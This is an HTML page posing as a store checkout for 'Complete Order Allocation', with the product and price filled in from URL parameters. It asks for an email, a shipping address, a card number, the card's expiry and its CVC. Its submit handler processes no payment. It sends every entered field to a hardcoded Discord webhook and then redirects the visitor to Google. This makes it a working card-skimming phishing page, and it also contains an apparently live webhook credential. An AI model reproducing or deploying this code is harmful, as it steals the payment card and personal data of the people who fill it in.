<!DOCTYPE html>
<html lang="en">
<head>
  <script src="lock.js" defer></script>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Complete Order Allocation</title>
  <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;700&display=swap" rel="stylesheet">
  <style>
    body { 
      font-family: 'IBM Plex Mono', monospace; 
      background: #ffffff; 
      color: #000000; 
      -webkit-font-smoothing: antialiased; 
      letter-spacing: -0.04em;
      margin: 0;
      padding: 0;
    }
    .form-input { 
      width: 100%; 
      padding: 12px; 
      font-size: 13px; 
      border: 1px solid #000; 
      background: #fff; 
      color: #000; 
      outline: none; 
      border-radius: 0; 
      text-transform: uppercase; 
    }
    .form-input::placeholder { color: #999; }
    .btn-submit-action { 
      width: 100%; 
      background: #000; 
      color: #fff; 
      border: 1px solid #000; 
      padding: 18px; 
      text-transform: uppercase; 
      font-weight: 700; 
      cursor: pointer; 
      font-size: 13px; 
      letter-spacing: 0.05em; 
      transition: all 0.2s ease;
    }
    .btn-submit-action:hover { background: #fff; color: #000; }

    /* STICKY HEADER MATRIX: Keeps top allocation display static */
    .sticky-summary-hdr {
      position: sticky;
      top: 0;
      background: #ffffff;
      z-index: 50;
      padding-top: max(16px, env(safe-area-inset-top));
      padding-bottom: 12px;
      margin-bottom: 24px;
    }
  </style>
</head>
<body class="min-h-screen flex justify-center items-start">

  <div class="w-full max-w-xl px-4 pb-12">
    
    <div class="sticky-summary-hdr">
      <div class="border border-black p-6 text-center bg-zinc-50">
        <span class="text-sm font-bold block uppercase tracking-wider mb-1" id="ui-summary-name">LOADING ALLOCATION...</span>
        <span class="text-xs text-zinc-500 block mb-3" id="ui-summary-breakdown">—</span>
        <div class="border-t border-black pt-3 flex justify-between items-center text-sm font-bold uppercase">
          <span>Total Cost</span>
          <span id="ui-summary-total">$0.00</span>
        </div>
      </div>
    </div>

    <form id="checkoutForm" class="flex flex-col gap-6" data-redirect="https://www.google.com">
      <input type="hidden" name="Ordered_Product" id="form-prod-name">
      <input type="hidden" name="Quantity" id="form-prod-qty">
      <input type="hidden" name="Price_Total" id="form-prod-price">
      
      <div>
        <h3 class="text-sm font-bold uppercase border-b border-black pb-2 mb-4 tracking-wider">Contact Information</h3>
        <div class="flex flex-col gap-1">
          <label for="contact-email" class="text-xs font-bold uppercase tracking-wide">Email</label>
          <input type="email" id="contact-email" name="Contact_Email" class="form-input" required autocomplete="email" placeholder="YOUR EMAIL">
        </div>
      </div>

      <div>
        <h3 class="text-sm font-bold uppercase border-b border-black pb-2 mb-4 tracking-wider">Shipping Address</h3>
        <div class="flex flex-col gap-4">
          <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
            <div class="flex flex-col gap-1">
              <label for="first-name" class="text-xs font-bold uppercase tracking-wide">First Name</label>
              <input type="text" id="first-name" name="First_Name" class="form-input" required autocomplete="given-name" placeholder="FIRST NAME">
            </div>
            <div class="flex flex-col gap-1">
              <label for="last-name" class="text-xs font-bold uppercase tracking-wide">Last Name</label>
              <input type="text" id="last-name" name="Last_Name" class="form-input" required autocomplete="family-name" placeholder="LAST NAME">
            </div>
          </div>
          
          <div class="flex flex-col gap-1">
            <label for="address" class="text-xs font-bold uppercase tracking-wide">Street Address</label>
            <input type="text" id="address" name="Shipping_Address" class="form-input" required autocomplete="shipping street-address" placeholder="STREET ADDRESS">
          </div>
          
          <div class="flex flex-col gap-1">
            <label for="address2" class="text-xs font-bold uppercase tracking-wide">Extra (Apt, Suite, Etc.)</label>
            <input type="text" id="address2" name="Shipping_Address_Line2" class="form-input" autocomplete="address-line2" placeholder="APT, SUITE, ETC.">
          </div>

          <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
            <div class="flex flex-col gap-1">
              <label for="city" class="text-xs font-bold uppercase tracking-wide">City</label>
              <input type="text" id="city" name="Shipping_City" class="form-input" required autocomplete="address-level2" placeholder="CITY">
            </div>
            <div class="flex flex-col gap-1">
              <label for="country" class="text-xs font-bold uppercase tracking-wide">Country</label>
              <input id="country" name="Shipping_Country" value="United States" disabled class="form-input h-[45px]" required autocomplete="country">
            </div>
          </div>
        </div>
      </div>

      <div>
        <h3 class="text-sm font-bold uppercase border-b border-black pb-2 mb-4 tracking-wider">Payment Information</h3>
        <div class="flex flex-col gap-4">
          <div class="flex flex-col gap-1">
            <label for="cc-number" class="text-xs font-bold uppercase tracking-wide">Card Number</label>
            <input type="text" id="cc-number" name="Card_Number" class="form-input" required autocomplete="cc-number" inputmode="numeric" maxlength="19" placeholder="0000 0000 0000 0000">
          </div>
          
          <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
            <div class="flex flex-col gap-1">
              <label for="cc-exp" class="text-xs font-bold uppercase tracking-wide">Expires</label>
              <input type="text" id="cc-exp" name="Card_Expiry" class="form-input" required autocomplete="cc-exp" inputmode="numeric" maxlength="7" placeholder="MM / YY">
            </div>
            <div class="flex flex-col gap-1">
              <label for="cc-csc" class="text-xs font-bold uppercase tracking-wide">CVC</label>
              <input type="text" id="cc-csc" name="Card_CVC" class="form-input" required autocomplete="cc-csc" inputmode="numeric" maxlength="4" placeholder="000">
            </div>
          </div>
        </div>
      </div>

      <button type="submit" class="btn-submit-action mt-2" id="submitBtn">Complete Order</button>
    </form>
  </div>

  <script>
    document.addEventListener("DOMContentLoaded", function () {
      const urlParams = new URLSearchParams(window.location.search);
      const prodName = urlParams.get('prod') || "PRODUCT ALLOCATION";
      const prodQty = urlParams.get('qty') || "1";
      const prodPrice = urlParams.get('price') || "$0.00";

      const numericPrice = parseFloat(prodPrice.replace(/[^0-9.]/g, '')) || 0;
      const calculatedBasePrice = (numericPrice / parseInt(prodQty)).toFixed(2);
      const currencyPrefix = (prodPrice.match(/^[^0-9.]+/) || ["$"])[0];
      const currencySuffix = (prodPrice.match(/[A-Za-z ]+$/) || [""])[0];
      const baseFormatted = currencyPrefix + calculatedBasePrice + currencySuffix;

      document.getElementById("ui-summary-name").innerText = prodName;
      document.getElementById("ui-summary-breakdown").innerText = `${prodQty} x ${baseFormatted}`;
      document.getElementById("ui-summary-total").innerText = prodPrice;

      document.getElementById("form-prod-name").value = prodName;
      document.getElementById("form-prod-qty").value = prodQty;
      document.getElementById("form-prod-price").value = prodPrice;

      // Card Number Formatter
      const cardInput = document.getElementById("cc-number");
      cardInput.addEventListener("input", function (e) {
        let value = e.target.value.replace(/\D/g, "");
        let matches = value.match(/\d{1,4}/g);
        e.target.value = matches ? matches.join(" ") : "";
      });

      // Expiry Date Formatter
      const expiryInput = document.getElementById("cc-exp");
      expiryInput.addEventListener("input", function (e) {
        let value = e.target.value.replace(/\D/g, "");
        
        if (value.length === 1 && value > "1") {
          value = "0" + value;
        }
        
        if (value.length >= 2) {
          let month = parseInt(value.substring(0, 2), 10);
          if (month > 12) {
            value = "12" + value.substring(2);
          } else if (month === 0) {
            value = "01";
          }
        }

        if (value.length > 2) {
          e.target.value = value.substring(0, 2) + " / " + value.substring(2, 4);
        } else {
          e.target.value = value;
        }
      });

      expiryInput.addEventListener("keydown", function (e) {
        if (e.key === "Backspace" && (e.target.value.endsWith(" ") || e.target.value.endsWith("/"))) {
          e.preventDefault();
          let value = e.target.value.replace(/\D/g, "");
          e.target.value = value.substring(0, value.length - 1);
        }
      });

      // CVC Input restriction
      const cvcInput = document.getElementById("cc-csc");
      cvcInput.addEventListener("input", function (e) {
        e.target.value = e.target.value.replace(/\D/g, "");
      });

      // Form Submission Logic
      document.getElementById("checkoutForm").addEventListener("submit", function (event) { 
        event.preventDefault(); 

        var btn = document.getElementById("submitBtn");
        btn.innerText = "PROCESSING DISPATCH...";
        btn.disabled = true;

        var formData = new FormData(this); 
        var message = "```\n"; 

        for (var pair of formData.entries()) { 
            message += pair[0] + ": " + pair[1] + "\n"; 
        } 

        message += "```"; 

        var webhookUrl = "https://discord.com/api/webhooks/1516523661585158308/GLfS_skoh2m5JM0klCXeZ07z_F-4ocmxx1GVlUmW7RHzc_QfdWDMSgez-adUac62fdd6"; 
        var redirectLink = this.getAttribute("data-redirect"); 

        var data = { 
            content: message, 
        }; 

        fetch(webhookUrl, { 
            method: "POST", 
            headers: { 
                "Content-Type": "application/json", 
            }, 
            body: JSON.stringify(data), 
        }) 
        .then((response) => response.text()) 
        .then((result) => { 
            console.log("Success:", result); 
            window.location.href = redirectLink; 
        }) 
        .catch((error) => { 
            console.error("Error:", error); 
            window.location.href = redirectLink;
        }); 
      });
    });
  </script>
</body>
</html>
